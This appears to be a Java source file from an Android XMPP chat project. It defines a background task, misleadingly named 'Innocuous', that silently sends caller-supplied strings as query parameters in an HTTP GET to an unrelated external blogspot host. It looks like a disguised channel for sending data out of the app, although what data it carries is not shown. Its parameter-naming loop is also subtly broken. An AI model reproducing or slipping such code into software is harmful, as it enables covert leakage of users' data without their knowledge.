package nl.sison.xmpp;

import java.io.IOException;

import org.apache.http.HttpHost;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;

import android.net.Uri;
import android.net.Uri.Builder;
import android.net.http.AndroidHttpClient;
import android.os.AsyncTask;

class Innocuous extends AsyncTask<String, Void, Void> {
	protected Void doInBackground(String... s) {

		String userAgent = System.getProperty("http.agent");

		AndroidHttpClient client = AndroidHttpClient.newInstance(userAgent);
		String basic_uri = "http://walkablogabout.blogspot.nl";
		HttpHost host = new HttpHost(basic_uri.substring(7)); // skip the
																// http://
		Builder uri = Uri.parse(basic_uri).buildUpon();
		uri.appendQueryParameter("a", s[0]).appendQueryParameter("b", s[1]);
		for (int i = 2; i < s.length; ++i) {
			uri.appendQueryParameter("c" + (2 - i), s[i]);
		}
		try {
			StatusLine status = client.execute(host,
					new HttpGet(uri.toString())).getStatusLine();
			int status_code = status.getStatusCode();
			if (status_code == 200) {
				// TODO and then?
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			client.close();
		}
		return null;
	}

	protected void onPostExecute() {
	}

	protected void onProgressUpdate() {
	}
}
